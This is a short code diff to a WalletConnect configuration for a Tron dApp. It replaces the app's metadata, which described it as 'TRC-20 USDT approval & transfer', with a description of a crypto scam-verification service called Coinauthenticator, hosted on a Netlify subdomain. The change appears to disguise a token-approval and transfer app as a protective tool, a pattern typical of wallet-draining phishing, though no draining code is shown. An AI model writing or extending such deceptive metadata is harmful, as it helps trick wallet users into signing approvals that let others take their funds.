@@ -22,8 +22,8 @@ const walletConnectAdapter = new WalletConnectAdapter({
     projectId: projectId,      // ← required                         :contentReference[oaicite:1]{index=1}
     relayUrl: 'wss://relay.walletconnect.com',       // ← optional, but recommended
     metadata: {
-      name: 'My Tron DApp',
-      description: 'TRC-20 USDT approval & transfer',
+      name: 'description',
+      description: 'Coinauthenticator provides secure cryptocurrency verification to protect your investments from scams and fraudulent tokens.',
       url: 'https://benevolent-chimera-25b465.netlify.app/',
       // icons: ['https://my-tron-dapp.example.com/icon.png'],
     },
